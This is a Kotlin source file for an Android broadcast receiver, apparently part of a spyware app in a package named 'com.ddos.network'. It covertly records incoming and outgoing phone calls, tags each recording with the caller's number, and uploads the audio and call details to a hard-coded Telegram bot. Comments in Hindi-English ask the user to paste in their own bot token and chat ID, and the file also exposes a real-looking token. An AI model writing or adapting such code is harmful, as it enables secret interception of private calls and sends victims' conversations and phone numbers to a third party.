package com.ddos.network

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.telephony.TelephonyManager
import java.io.File

class CallRecorder : BroadcastReceiver() {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var isRecording = false

    override fun onReceive(context: Context, intent: Intent) {
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

        when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                // Incoming call — start recording
                startRecording(context, number ?: "unknown", true)
            }

            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                // Call answered
                if (!isRecording) {
                    startRecording(context, number ?: "unknown", false)
                }
            }

            TelephonyManager.EXTRA_STATE_IDLE -> {
                // Call ended — stop and upload
                stopAndUpload(context)
            }
        }
    }

    private fun startRecording(context: Context, number: String, isIncoming: Boolean) {
        try {
            val dir = File(context.getExternalFilesDir(null), "calls")
            dir.mkdirs()

            val timestamp = System.currentTimeMillis()
            val prefix = if (isIncoming) "IN" else "OUT"

            outputFile = File(dir, "${prefix}_${number}_$timestamp.m4a")

            recorder = if (Build.VERSION.SDK_INT >= 31) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(outputFile?.absolutePath)
                prepare()
                start()
            }

            isRecording = true

            // 🔴 BOT TOKEN YAHAN DAALO
            val bot = TelegramBot(
                "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
                "8507217564",    // ← YAHAN APNA CHAT ID DAALO
                context
            )
            bot.sendMessage("📞 CALL STARTED\n📱 Number: $number\n📞 Type: ${if (isIncoming) "INCOMING" else "OUTGOING"}")

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopAndUpload(context: Context) {
        if (!isRecording) return

        try {
            recorder?.apply {
                stop()
                release()
            }
        } catch (e: Exception) {
            // Already stopped
        }

        recorder = null
        isRecording = false

        // Upload to Telegram
        outputFile?.let { file ->
            if (file.exists() && file.length() > 1000) {
                // 🔴 BOT TOKEN YAHAN DAALO
                val bot = TelegramBot(
                    "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
                    "8507217564",    // ← YAHAN APNA CHAT ID DAALO
                    context
                )

                bot.sendMessage("📞 CALL ENDED\n📁 Size: ${file.length() / 1024} KB\n⏫ Uploading...")
                bot.uploadAudio(file)
            }
        }
    }
}
